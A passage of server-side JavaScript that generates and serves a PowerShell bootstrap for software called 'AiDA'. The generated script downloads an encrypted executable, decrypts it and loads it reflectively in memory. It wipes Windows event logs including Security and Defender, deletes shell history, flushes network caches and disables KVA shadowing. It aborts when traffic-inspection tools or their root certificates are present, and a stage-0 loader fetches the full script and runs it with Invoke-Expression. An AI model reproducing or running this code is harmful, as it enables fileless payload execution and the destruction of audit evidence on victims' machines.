        '                $tCb.Invoke($base,[uint32]1,[IntPtr]::Zero)',
        '                Write-AidaStatus ("[PE-DBG] step7c TLS callback invoke exit index={0}" -f $cbI2)',
        '                $cbI2++',
        '            }',
            '            Write-AidaStatus ("[PE-DBG] step7c TLS callbacks invoked count={0}" -f $cbI2)',
        '        }',
        '    }',
        '    if($lcRVA -ne 0 -and $lcDirSz -ge 0x9C){',
        '        $lcPtr=[IntPtr]($base.ToInt64()+$lcRVA)',
        '        $guardCheckCellRaw=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($lcPtr.ToInt64()+0x78))',
        '        $guardDispatchCellRaw=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($lcPtr.ToInt64()+0x80))',
        '        $guardTableRaw=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($lcPtr.ToInt64()+0x88))',
        '        $guardCount=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($lcPtr.ToInt64()+0x90))',
        '        $guardFlags=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($lcPtr.ToInt64()+0x98))',
        '        Write-AidaStatus ("[PE-DBG] step7d CFG metadata check_cell={0:X16} dispatch_cell={1:X16} table={2:X16} count={3} flags={4:X8}" -f $guardCheckCellRaw,$guardDispatchCellRaw,$guardTableRaw,$guardCount,$guardFlags)',
        '        if($guardCheckCellRaw -ne 0 -or $guardDispatchCellRaw -ne 0 -or $guardCount -gt 0){',
        '            $hostCheckValue=[int64]0; $hostDispatchValue=[int64]0',
        '            if($hostImageBaseForCfg -ne 0){',
        '                try{',
        '                    $hostLf=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($hostImageBaseForCfg+0x3C))',
        '                    $hostOpt=[IntPtr]($hostImageBaseForCfg+$hostLf+24)',
        '                    $hostLcRva=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($hostOpt.ToInt64()+112+10*8))',
        '                    $hostLcSz=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($hostOpt.ToInt64()+112+10*8+4))',
        '                    if($hostLcRva -ne 0 -and $hostLcSz -ge 0x88){',
        '                        $hostLc=[IntPtr]($hostImageBaseForCfg+$hostLcRva)',
        '                        $hostCheckCell=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($hostLc.ToInt64()+0x78))',
        '                        $hostDispatchCell=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($hostLc.ToInt64()+0x80))',
        '                        if($hostCheckCell -ne 0){$hostCheckValue=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$hostCheckCell)}',
        '                        if($hostDispatchCell -ne 0){$hostDispatchValue=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$hostDispatchCell)}',
        '                    }',
        '                } catch { Write-AidaStatus ("[PE-DBG] step7d CFG host pointer read failed " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message) }',
        '            }',
        '            Write-AidaStatus ("[PE-DBG] step7d CFG host check={0:X16} dispatch={1:X16}" -f $hostCheckValue,$hostDispatchValue)',
        '            $guardCheckCell=Resolve-AidaMappedVa ([uint64]$guardCheckCellRaw) $base ([uint64]$imgBase) $sizeOfImg',
        '            $guardDispatchCell=Resolve-AidaMappedVa ([uint64]$guardDispatchCellRaw) $base ([uint64]$imgBase) $sizeOfImg',
        '            if($guardCheckCellRaw -ne 0 -and $guardCheckCell -eq [IntPtr]::Zero){throw "AiDA: CFG check pointer cell is outside mapped image."}',
        '            if($guardDispatchCellRaw -ne 0 -and $guardDispatchCell -eq [IntPtr]::Zero){throw "AiDA: CFG dispatch pointer cell is outside mapped image."}',
        '            if($guardCheckCell -ne [IntPtr]::Zero -and $hostCheckValue -ne 0){[Runtime.InteropServices.Marshal]::WriteInt64($guardCheckCell,$hostCheckValue)}',
        '            if($guardDispatchCell -ne [IntPtr]::Zero -and $hostDispatchValue -ne 0){[Runtime.InteropServices.Marshal]::WriteInt64($guardDispatchCell,$hostDispatchValue)}',
        '            if($guardCount -gt 0){',
        '                if($null -eq $SetProcessValidCallTargets){throw "AiDA: SetProcessValidCallTargets unavailable for CFG image."}',
        '                $guardTable=Resolve-AidaMappedVa ([uint64]$guardTableRaw) $base ([uint64]$imgBase) $sizeOfImg',
        '                if($guardTable -eq [IntPtr]::Zero){throw "AiDA: CFG function table is outside mapped image."}',
        '                $stride=4 + ((([uint32]$guardFlags) -band 0xF0000000) -shr 28)',
        '                if($stride -lt 4 -or $stride -gt 16){throw ("AiDA: CFG table stride is invalid: {0}" -f $stride)}',
        '                $targets=@{}; $maxTargets=[Math]::Min([int64]$guardCount, [int64]1000000)',
        '                for($gi=[int64]0;$gi -lt $maxTargets;$gi++){',
        '                    $targetRva=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($guardTable.ToInt64()+$gi*$stride))',
        '                    if($targetRva -gt 0 -and $targetRva -lt [int]$sizeOfImg){',
        '                        $targetVa=$base.ToInt64()+[int64]$targetRva',
        '                        $pageVa=$targetVa -band (-bnot 0xFFF)',
        '                        $off=[uint64]($targetVa-$pageVa)',
        '                        if(-not $targets.ContainsKey($pageVa)){$targets[$pageVa]=New-Object System.Collections.Generic.List[UInt64]}',
        '                        $targets[$pageVa].Add($off)',
        '                    }',
        '                }',
        '                $registered=0; $failed=0',
        '                foreach($pageKey in $targets.Keys){',
        '                    $list=$targets[$pageKey]',
        '                    $info=[Runtime.InteropServices.Marshal]::AllocHGlobal($list.Count*16)',
        '                    try{',
        '                        for($ci=0;$ci -lt $list.Count;$ci++){[Runtime.InteropServices.Marshal]::WriteInt64($info,$ci*16,[int64]$list[$ci]);[Runtime.InteropServices.Marshal]::WriteInt64($info,$ci*16+8,1)}',
        '                        $ok=$SetProcessValidCallTargets.Invoke([IntPtr](-1),[IntPtr]([int64]$pageKey),[UIntPtr]0x1000,[uint32]$list.Count,$info)',
        '                        if($ok){$registered+=$list.Count}else{$failed+=$list.Count}',
        '                    } finally { if($info -ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::FreeHGlobal($info)} }',
        '                }',
        '                Write-AidaStatus ("[PE-DBG] step7d CFG call targets registered={0} failed={1} pages={2} stride={3}" -f $registered,$failed,$targets.Count,$stride)',
        '            }',
        '        }',
        '    }',
        '    $gh.Free()',
        '    [Array]::Clear($pe,0,$pe.Length)',
        '    $epPtr=[IntPtr]($base.ToInt64()+$epRVA)',
        '    $dEntry=New-AidaDelegateType ([Type[]]@()) ([uint32])',
        '    $EntryPoint=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($epPtr,$dEntry)',
        '    $oldPayloadTrace=[Environment]::GetEnvironmentVariable("AIDA_PAYLOAD_TRACE","Process")',
        '    $oldFilelessLaunch=[Environment]::GetEnvironmentVariable("AIDA_FILELESS_LAUNCH","Process")',
        '    $oldFilelessDebugLog=[Environment]::GetEnvironmentVariable("AIDA_FILELESS_DEBUG_LOG_PATH","Process")',
        '    $oldFilelessBootstrapLog=[Environment]::GetEnvironmentVariable("AIDA_FILELESS_BOOTSTRAP_LOG_PATH","Process")',
        '    $oldFilelessImageBase=[Environment]::GetEnvironmentVariable("AIDA_FILELESS_IMAGE_BASE","Process")',
        '    $oldFilelessImageSize=[Environment]::GetEnvironmentVariable("AIDA_FILELESS_IMAGE_SIZE","Process")',
        '    $oldFilelessEntryRva=[Environment]::GetEnvironmentVariable("AIDA_FILELESS_ENTRY_RVA","Process")',
        '    $oldFilelessNoDisk=[Environment]::GetEnvironmentVariable("AIDA_FILELESS_NO_DISK_WRITE","Process")',
        '    Set-AidaProcessEnvValue "AIDA_PAYLOAD_TRACE" "1"',
        '    Set-AidaProcessEnvValue "AIDA_FILELESS_LAUNCH" "1"',
        '    Set-AidaProcessEnvValue "AIDA_FILELESS_DEBUG_LOG_PATH" ([string]$script:AidaFilelessDebugLogPath)',
        '    Set-AidaProcessEnvValue "AIDA_FILELESS_BOOTSTRAP_LOG_PATH" $AidaBootstrapLogPath',
        '    Set-AidaProcessEnvValue "AIDA_FILELESS_IMAGE_BASE" ("0x{0:X16}" -f $base.ToInt64())',
        '    Set-AidaProcessEnvValue "AIDA_FILELESS_IMAGE_SIZE" ("0x{0:X}" -f $sizeOfImg)',
        '    Set-AidaProcessEnvValue "AIDA_FILELESS_ENTRY_RVA" ("0x{0:X}" -f $epRVA)',
        '    Set-AidaProcessEnvValue "AIDA_FILELESS_NO_DISK_WRITE" "1"',
        '    try {',
        '        $entryTid=if($null -ne $GetCurrentThreadId){$GetCurrentThreadId.Invoke()}else{0}',
        '        $entryTeb=0; $entryTlsVector=0; $entryTlsSlotValue=0',
        '        if($null -ne $NtQueryInformationThread){try{$entryInfo=Get-AidaStaticTlsInfo $entryTid ([IntPtr](-2)) $NtQueryInformationThread;$entryTeb=$entryInfo.teb;$entryTlsVector=$entryInfo.vector;if((Get-Variable tlsIndex -ErrorAction SilentlyContinue) -and $entryTlsVector -ne 0){$entryTlsSlotValue=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($entryTlsVector+([int64]$tlsIndex*8)))}}catch{Write-AidaStatus ("[PE-DBG] step8 entry_thread_snapshot_failed " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message)}}',
        '        Write-AidaStatus ("[PE-DBG] step8 direct_entry_enter epPtr={0:X16} base={1:X16} sizeOfImg={2:X} tid={3} teb={4:X16} tls_vector={5:X16} tls_index={6} tls_value={7:X16} debug_log={8} no_disk_write=1" -f $epPtr.ToInt64(),$base.ToInt64(),$sizeOfImg,$entryTid,$entryTeb,$entryTlsVector,$tlsIndex,$entryTlsSlotValue,$script:AidaFilelessDebugLogPath)',
        '        $entryRet=$EntryPoint.Invoke()',
        '        Write-AidaStatus ("[PE-DBG] step9 direct_entry_return ret={0:X8}" -f $entryRet)',
        '    } catch {',
        '        Write-AidaBootstrapLog ("direct_entry_exception type=" + $_.Exception.GetType().FullName + " hresult=0x" + $_.Exception.HResult.ToString("X8") + " message=" + $_.Exception.Message)',
        '        throw',
        '    } finally {',
        '        Set-AidaProcessEnvValue "AIDA_PAYLOAD_TRACE" $oldPayloadTrace',
        '        Set-AidaProcessEnvValue "AIDA_FILELESS_LAUNCH" $oldFilelessLaunch',
        '        Set-AidaProcessEnvValue "AIDA_FILELESS_DEBUG_LOG_PATH" $oldFilelessDebugLog',
        '        Set-AidaProcessEnvValue "AIDA_FILELESS_BOOTSTRAP_LOG_PATH" $oldFilelessBootstrapLog',
        '        Set-AidaProcessEnvValue "AIDA_FILELESS_IMAGE_BASE" $oldFilelessImageBase',
        '        Set-AidaProcessEnvValue "AIDA_FILELESS_IMAGE_SIZE" $oldFilelessImageSize',
        '        Set-AidaProcessEnvValue "AIDA_FILELESS_ENTRY_RVA" $oldFilelessEntryRva',
        '        Set-AidaProcessEnvValue "AIDA_FILELESS_NO_DISK_WRITE" $oldFilelessNoDisk',
        '    }',
        '}',
        'function Invoke-AidaAntiForensics {',
        '    $__ea = $ErrorActionPreference; $ErrorActionPreference = "SilentlyContinue"',
        '    foreach ($__log in @("Microsoft-Windows-PowerShell/Operational","Microsoft-Windows-PowerShell/Analytic","Microsoft-Windows-PowerShell/Debug","Windows PowerShell","Microsoft-Windows-WMI-Activity/Operational","Microsoft-Windows-TaskScheduler/Operational")) { try { & wevtutil sl $__log /e:false *>$null } catch { } }',
        '    foreach ($__log in @("Application","System","Setup","Security","Microsoft-Windows-PowerShell/Operational","Microsoft-Windows-PowerShell/Admin","Microsoft-Windows-WMI-Activity/Operational","Microsoft-Windows-Kernel-Process/Operational","Windows Defender/Operational","Microsoft-Windows-TaskScheduler/Operational")) { try { & wevtutil cl $__log *>$null } catch { } }',
        '    try { Clear-DnsClientCache *>$null } catch { }',
        '    try { & cmd /c "ipconfig /flushdns" >nul 2>&1 } catch { }',
        '    try { & arp -d * >nul 2>&1 } catch { }',
        '    try { & nbtstat -R >nul 2>&1 } catch { }',
        '    try { & nbtstat -RR >nul 2>&1 } catch { }',
        '    foreach ($__p in @(($env:APPDATA + "\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"),($env:LOCALAPPDATA + "\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"))) { try { Remove-Item -Path $__p -Force *>$null } catch { } }',
        '    try { if (Get-Module -Name PSReadline -ErrorAction SilentlyContinue) { $__hp = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath; if ($__hp) { Remove-Item -Path $__hp -Force -ErrorAction SilentlyContinue } } } catch { }',
        '    try { Clear-History } catch { }',
        '    try { Remove-Item -Force -Recurse "HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell" *>$null } catch { }',
        '    try { $__k="HKLM:\\SOFTWARE\\Microsoft\\Windows\\Dwm"; foreach ($__v in @("OverlayTestMode","EnableOverlay","OverlayMinFPS")) { Remove-ItemProperty $__k $__v -ErrorAction SilentlyContinue } } catch { }',
        '    try { Remove-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers" DisableOverlays -ErrorAction SilentlyContinue } catch { }',
        '    $ErrorActionPreference = $__ea',
        '}',
        'function Invoke-AidaSystemPrep {',
        '    try { $__kvaKey = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management"; $__cur = try { (Get-ItemProperty -Path $__kvaKey -Name FeatureSettingsOverride -ErrorAction Stop).FeatureSettingsOverride } catch { -1 }; if ($__cur -ne 3) { Set-ItemProperty -Path $__kvaKey -Name FeatureSettingsOverride -Type DWord -Value 3; Set-ItemProperty -Path $__kvaKey -Name FeatureSettingsOverrideMask -Type DWord -Value 3; Write-AidaBootstrapLog "sys_prep kva_shadowing_disabled" } } catch { Write-AidaBootstrapLog ("sys_prep kva_disable_skipped " + $_.Exception.Message) }',
        '    try { $__cdKey = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CrashControl"; $__cdVal = try { (Get-ItemProperty -Path $__cdKey -Name CrashDumpEnabled -ErrorAction Stop).CrashDumpEnabled } catch { $null }; if ($__cdVal -eq 0) { Set-ItemProperty -Path $__cdKey -Name CrashDumpEnabled -Type DWord -Value 7; Write-AidaBootstrapLog "sys_prep crash_dump_reenabled" } } catch { }',
        '    try { if (Test-Path "HKLM:\\SOFTWARE\\Parsec") { Remove-Item -Path "HKLM:\\SOFTWARE\\Parsec" -Recurse -Force; Write-AidaBootstrapLog "sys_prep parsec_key_removed" } } catch { }',
        '}',
        'function Test-AidaTextContainsAny([string]$Text,[string[]]$Needles) { if (-not $Text) { return "" }; $t = $Text.ToLowerInvariant(); foreach ($n in $Needles) { if ($n -and $t.Contains($n)) { return $n } }; return "" }',
        'function Test-AidaTextEqualsAny([string]$Text,[string[]]$Needles) { if (-not $Text) { return "" }; $t = $Text.ToLowerInvariant(); foreach ($n in $Needles) { if ($n -and $t -eq $n) { return $n } }; return "" }',
        'function Test-AidaProcessPathIndicatesInterceptor([string]$Path) { if (-not $Path) { return "" }; $leaf = ""; $base = ""; try { $leaf = [IO.Path]::GetFileName($Path).ToLowerInvariant(); $base = [IO.Path]::GetFileNameWithoutExtension($Path).ToLowerInvariant() } catch { return "" }; foreach ($exact in @("charles.exe","charlesproxy.exe")) { if ($leaf -eq $exact) { return "charles" } }; foreach ($needle in @("burpsuite","fiddler","wireshark","httpdebugger","mitmproxy","proxyman","httptoolkit","zaproxy","reqable")) { if ($base.Contains($needle) -or $leaf.Contains($needle)) { return $needle } }; return "" }',
        'function Assert-AidaBootstrapDeadline([DateTimeOffset]$Deadline,[string]$Stage) { if ([DateTimeOffset]::UtcNow -gt $Deadline) { Write-AidaBootstrapLog ("intercept_timeout stage=" + $Stage); throw "AiDA bootstrap monitoring-tool check timed out. Close monitoring tools and try again." } }',
        'function Assert-AidaNoInterceptors {',
        '    Write-AidaBootstrapLog "intercept_check_start"',
        '    $__deadline = [DateTimeOffset]::UtcNow.AddSeconds(20)',
        '    $__needles = @("burp suite","burpsuite","fiddler","wireshark","httpdebugger","mitmproxy","charles proxy","charlesproxy","proxyman","http toolkit","httptoolkit","owasp zap","zaproxy","james proxy","reqable")',
        '    $__exactProcessNames = @("charles")',
        '    foreach ($__svc in @("HTTPDebuggerPro","HTTPDebuggerSvc")) { Assert-AidaBootstrapDeadline $__deadline "services"; if (Get-Service -Name $__svc -ErrorAction SilentlyContinue) { Write-AidaBootstrapLog ("intercept_abort service=" + $__svc); throw "AiDA bootstrap aborted: HTTPDebugger monitoring service detected. Disable it before continuing." } }',
        '    Write-AidaBootstrapLog "intercept_services_checked"',
        '    $__certNeedles = @("portswigger","do_not_trust_fiddler","fiddlerroot","mitmproxy","charles proxy","httpdebugger","proxyman","http toolkit","zap root")',
        '    $__certCount = 0',
        '    foreach ($__scope in @([Security.Cryptography.X509Certificates.StoreLocation]::LocalMachine,[Security.Cryptography.X509Certificates.StoreLocation]::CurrentUser)) {',
        '        foreach ($__sn in @("Root","CA")) {',
        '            Assert-AidaBootstrapDeadline $__deadline "certificates"',
        '            $__store = New-Object Security.Cryptography.X509Certificates.X509Store($__sn,$__scope)',
        '            try {',
        '                $__store.Open([Security.Cryptography.X509Certificates.OpenFlags]::ReadOnly)',
        '                foreach ($__cert in $__store.Certificates) {',
        '                    $__certCount++',
        '                    if (($__certCount % 128) -eq 0) { Assert-AidaBootstrapDeadline $__deadline "certificates" }',
        '                    $__hit = Test-AidaTextContainsAny (($__cert.Subject + " " + $__cert.Issuer)) $__certNeedles',
        '                    if ($__hit) { Write-AidaBootstrapLog ("intercept_abort ssl_ca=" + $__hit); throw "AiDA bootstrap aborted: SSL interception CA certificate detected. Remove the proxy root certificate before continuing." }',
        '                }',
        '            } catch { if ($_.Exception.Message -like "AiDA bootstrap aborted*") { throw }; Write-AidaBootstrapLog ("intercept_cert_store_error store=" + $__sn + " scope=" + $__scope + " error=" + $_.Exception.Message) } finally { try { $__store.Close() } catch { } }',
        '        }',
        '    }',
        '    Write-AidaBootstrapLog ("intercept_certificates_checked count=" + $__certCount)',
        '    $__procCount = 0',
        '    foreach ($__proc in (Get-Process -ErrorAction Stop)) {',
        '        $__procCount++',
        '        if (($__procCount % 32) -eq 0) { Assert-AidaBootstrapDeadline $__deadline "processes" }',
        '        $__name = ""; $__title = ""; $__path = ""',
        '        try { $__name = [string]$__proc.ProcessName } catch { }',
        '        try { $__title = [string]$__proc.MainWindowTitle } catch { }',
        '        try { $__path = [string]$__proc.Path } catch { }',
        '        $__hit = Test-AidaTextContainsAny $__name $__needles; if (-not $__hit) { $__hit = Test-AidaTextEqualsAny $__name $__exactProcessNames }; if ($__hit) { Write-AidaBootstrapLog ("intercept_abort process_hit=" + $__hit + " source=name pid=" + $__proc.Id); throw ("AiDA bootstrap aborted: interceptor process detected (" + $__hit + "). Close monitoring tools before continuing.") }',
        '        $__hit = Test-AidaTextContainsAny $__title $__needles; if ($__hit) { Write-AidaBootstrapLog ("intercept_abort process_hit=" + $__hit + " source=title pid=" + $__proc.Id); throw ("AiDA bootstrap aborted: interceptor process detected (" + $__hit + "). Close monitoring tools before continuing.") }',
        '        $__hit = Test-AidaProcessPathIndicatesInterceptor $__path; if ($__hit) { Write-AidaBootstrapLog ("intercept_abort process_hit=" + $__hit + " source=path pid=" + $__proc.Id); throw ("AiDA bootstrap aborted: interceptor process detected (" + $__hit + "). Close monitoring tools before continuing.") }',
        '    }',
        '    Write-AidaBootstrapLog ("intercept_processes_checked count=" + $__procCount)',
        '    Write-AidaBootstrapLog "intercept_check_passed"',
        '}',
        'try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }',
        'Write-AidaStatus "Checking secure connection..."',
        'Assert-AidaTlsPin',
        'Enable-AidaPinnedTls',
        'Write-AidaStatus "Secure connection verified."',
        'Write-AidaStatus "Preparing system environment..."',
        'Invoke-AidaSystemPrep',
        'Write-AidaBootstrapLog "system_prep_done"',
        'Write-AidaStatus "Checking for monitoring tools..."',
        'Assert-AidaNoInterceptors',
        'Invoke-AidaAntiForensics',
        'Write-AidaBootstrapLog "pre_launch_wipe_done"',
        '$packageBytes = $null',
        '$exeBytes = $null',
        '$licenseKey = $null',
        '$currentHwid = $null',
        'try {',
        '$licenseKey = Get-AidaSecureText "AiDA license key"',
        'Write-AidaStatus "Collecting hardware identity..."',
        '$currentHwid = Get-AidaBootstrapHwid',
        'Write-AidaBootstrapLog ("hwid_v2_ready len=" + $currentHwid.Length)',
        '$clientNonce = New-AidaNonce',
        '$timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()',
        'Write-AidaStatus "Authorizing license..."',
        '$auth = Invoke-AidaJson "/api/bootstrap/authorize" @{ license_key = $licenseKey; hwid = $currentHwid; hwid_version = 2; client_nonce = $clientNonce; timestamp = $timestamp; powershell = $PSVersionTable.PSVersion.ToString() }',
        '$licenseKey = $null',
        'if (-not $auth.ok -or -not $auth.token) { throw "AiDA bootstrap authorization failed." }',
        '$tokenParts = Get-AidaTokenParts $auth.token',
        'Write-AidaStatus "Fetching signed release manifest..."',
        '$manifest = Invoke-AidaJson "/api/bootstrap/manifest" @{ token = $auth.token; client_nonce = $clientNonce; timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() }',
        '$auth.token = $null',
        'if (-not $manifest.ok -or -not $manifest.artifact -or -not $manifest.artifact.url -or -not $manifest.artifact.sha256) { throw "AiDA bootstrap manifest failed." }',
        'if ([string]$manifest.token_id -ne $tokenParts.id) { throw "AiDA bootstrap manifest token mismatch." }',
        'if ([int64]$manifest.expires_at -lt [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) { throw "AiDA bootstrap manifest expired." }',
        '$expectedManifestMac = Get-AidaHmacHex $tokenParts.secret (Get-AidaManifestMacInput $manifest)',
        'if (-not (Test-AidaHexEqual $expectedManifestMac ([string]$manifest.manifest_mac))) { throw "AiDA bootstrap manifest authentication failed." }',
        'if ([string]$manifest.manifest_sig_alg -ne "ECDSA_P256_SHA256_P1363" -or -not $manifest.manifest_sig_p256) { throw "AiDA bootstrap manifest signature is missing." }',
        'if (-not (Test-AidaP256Signature (Get-AidaManifestMacInput $manifest) ([string]$manifest.manifest_sig_p256))) { throw "AiDA bootstrap manifest signature verification failed." }',
        '$tokenParts.secret = $null',
        'if (-not $manifest.policy.one_time_token -or -not $manifest.policy.token_bound_to_client_nonce -or -not $manifest.policy.token_bound_to_source_ip -or -not $manifest.policy.artifact_https_required -or -not $manifest.policy.no_public_binary_route -or -not $manifest.policy.encrypted_public_artifact -or ($manifest.camoufox.configured -and -not $manifest.policy.camoufox_sidecar_hash_required) -or ($manifest.camoufox.mcp.configured -and -not $manifest.policy.camoufox_mcp_hash_required)) { throw "AiDA bootstrap manifest policy is invalid." }',
        'try { Install-AidaCamoufoxSidecar $manifest } catch { Write-AidaBootstrapLog ("camoufox_sidecar_skipped " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); Write-AidaStatus ("Camoufox setup skipped: " + $_.Exception.Message) }',
        '$artifactUri = [Uri]$manifest.artifact.url',
        'if ($artifactUri.Scheme -ne "https") { throw "AiDA artifact URL must use HTTPS." }',
        'if (-not $manifest.artifact.package) { throw "AiDA encrypted package metadata is required." }',
        '$packageSize = [int64]0; try { $packageSize = [int64]$manifest.artifact.package.size } catch { $packageSize = 0 }',
        '$packageSizeText = if ($packageSize -gt 0) { "{0:N1} MB" -f ($packageSize / 1MB) } else { "unknown size" }',
        'Write-AidaStatus ("Downloading and verifying encrypted package ({0})..." -f $packageSizeText)',
        '$packageBytes = Get-AidaPackageBytesWithProgress $artifactUri $packageSize ([string]$manifest.artifact.package.sha256)',
        'Write-AidaStatus "Decrypting package in memory..."',
        '$exeBytes = Decrypt-AidaPackageBytesToMemory $packageBytes $manifest.artifact.package',
        '[Array]::Clear($packageBytes, 0, $packageBytes.Length); $packageBytes = $null',
        'Write-AidaStatus "Verifying artifact hash..."',
        '$sha256 = [Security.Cryptography.SHA256]::Create()',
        '$actualHash = ConvertTo-AidaHex ($sha256.ComputeHash($exeBytes)); $sha256.Dispose(); $sha256 = $null',
        'if (-not (Test-AidaHexEqual $actualHash ([string]$manifest.artifact.sha256))) { throw "AiDA artifact SHA-256 verification failed." }',
        'Write-AidaStatus "Launching AiDA in memory (no disk write)..."',
        '$script:AidaFilelessDebugLogPath = Initialize-AidaFilelessDebugLog $actualHash $exeBytes.Length',
        'Test-AidaNoStandaloneDiskArtifact "pre_entry" $exeBytes.Length',
        'Write-AidaBootstrapLog ("launch_inmemory_enter bytes=" + $exeBytes.Length + " debug_log=" + $script:AidaFilelessDebugLogPath)',
        'Invoke-AidaPEInMemory $exeBytes',
        'Write-AidaBootstrapLog "launch_inmemory_returned"',
        'try { Invoke-AidaAntiForensics } catch { Write-AidaBootstrapLog ("post_launch_wipe_error " + $_.Exception.Message) }',
        'Write-AidaBootstrapLog "post_launch_wipe_done"',
        '[Array]::Clear($exeBytes, 0, $exeBytes.Length); $exeBytes = $null',
        'Write-AidaStatus "Done."',
        '} catch { Write-AidaBootstrapLog ("fatal_error " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); Write-Host ("AiDA bootstrap failed: " + $_.Exception.Message) -ForegroundColor Red; $global:LASTEXITCODE = 1; return } finally { Write-AidaBootstrapLog "cleanup_enter"; if ($licenseKey) { $licenseKey = $null }; if ($currentHwid) { $currentHwid = $null }; if ($auth -and $auth.token) { $auth.token = $null }; if ($tokenParts -and $tokenParts.secret) { $tokenParts.secret = $null }; if ($null -ne $packageBytes) { [Array]::Clear($packageBytes, 0, $packageBytes.Length); $packageBytes = $null }; if ($null -ne $exeBytes) { [Array]::Clear($exeBytes, 0,$exeBytes.Length); $exeBytes = $null }; try { Invoke-AidaAntiForensics } catch { }; Write-AidaBootstrapLog "cleanup_exit" }',
    ];
    return lines.join('\r\n') + '\r\n';
}

function sha256Hex(text) {
    return crypto.createHash('sha256').update(String(text), 'utf8').digest('hex');
}

function buildBootstrapStage0Script() {
    const cfg = getScriptRouteConfig();
    const fullScript = buildBootstrapScript();
    const pathOnly = cfg.script_path || (cfg.legacy_route_enabled ? cfg.legacy_path : '');
    if (!pathOnly) {
        return fullScript;
    }
    const fullHash = sha256Hex(fullScript);
    const origin = publicOrigin();
    const fullUrl = origin + pathOnly;
    const lines = [
        '$ErrorActionPreference = "Stop"',
        '$ProgressPreference = "SilentlyContinue"',
        'try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }',
        '$u = ' + psQuote(fullUrl),
        '$h = ' + psQuote(fullHash),
        'function ConvertTo-AidaHex([byte[]]$Bytes) { -join ($Bytes | ForEach-Object { $_.ToString("x2") }) }',
        '$req = [Net.HttpWebRequest]::Create($u)',
        '$req.Method = "GET"',
        '$req.UserAgent = "AiDA Bootstrap Stage0"',
        '$req.Accept = "application/vnd.aida.bootstrap"',
        '$req.AllowAutoRedirect = $false',
        '$req.Timeout = 60000',
        '$req.ReadWriteTimeout = 60000',
        '$resp = $null',
        '$reader = $null',
        '$s = $null',
        'try {',
        '    $resp = $req.GetResponse()',
        '    if ([int]$resp.StatusCode -ne 200) { throw "AiDA bootstrap stage fetch failed." }',
        '    $reader = New-Object IO.StreamReader($resp.GetResponseStream(), [Text.Encoding]::UTF8)',
        '    $s = $reader.ReadToEnd()',
        '} finally { if ($reader) { $reader.Dispose() }; if ($resp) { $resp.Dispose() } }',
        '$sha = [Security.Cryptography.SHA256]::Create()',
        'try { $actual = ConvertTo-AidaHex ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($s))) } finally { $sha.Dispose() }',
        'if ($actual -ne $h) { throw "AiDA bootstrap stage authentication failed." }',
        'Invoke-Expression $s',
    ];
    return lines.join('\r\n') + '\r\n';
}

async function scriptHandler(_req, res) {
    noStore(res);
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    return res.status(200).send(buildBootstrapScript());
}

async function rootScriptHandler(req, res, next) {
    if (!getScriptRouteConfig().root_content_negotiation || !acceptsBootstrapScript(req)) {
        return next();
    }
    noStore(res);
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    return res.status(200).send(buildBootstrapStage0Script());
}

function expectedArtifactFileName(release) {
    try {
        const url = new URL(release.url);
        return path.basename(url.pathname);
    } catch (_) {
        return '';
    }
}

function expectedCamoufoxSidecarFileName(release) {
    try {
        if (!release.camoufox || !release.camoufox.configured) return '';
        const url = new URL(release.camoufox.url);
        return path.basename(url.pathname);
    } catch (_) {
        return '';
    }
}

function expectedCamoufoxMcpFileName(release) {
    try {
        if (!release.camoufox || !release.camoufox.mcp || !release.camoufox.mcp.configured) return '';
        const url = new URL(release.camoufox.mcp.url);
        return path.basename(url.pathname);
    } catch (_) {
        return '';
    }
}

async function artifactHandler(req, res) {
    const release = getReleaseConfig();
    const requested = String(req.params && req.params.name || '');
    if (!release.ok || !release.package || !/^[A-Za-z0-9._-]{1,160}\.(?:pkg|zip|exe)$/i.test(requested)) {
        return res.status(404).json({ status: 'error', reason: 'not_found' });
    }
    const expectedPackage = expectedArtifactFileName(release);
    const expectedSidecar = expectedCamoufoxSidecarFileName(release);
    const expectedMcp = expectedCamoufoxMcpFileName(release);
    let expectedSize = 0;
    if (requested === expectedPackage) expectedSize = release.package.size;
    else if (requested === expectedSidecar) expectedSize = release.camoufox.size;
    else if (requested === expectedMcp) expectedSize = release.camoufox.mcp.size;
    if (!expectedSize) {
        return res.status(404).json({ status: 'error', reason: 'not_found' });
    }
    const artifactDir = path.resolve(process.env.AIDA_BOOTSTRAP_ARTIFACT_DIR || path.join(__dirname, '..', 'bootstrap_artifacts'));
    const resolved = path.resolve(artifactDir, requested);
    if (resolved !== path.join(artifactDir, requested)) {
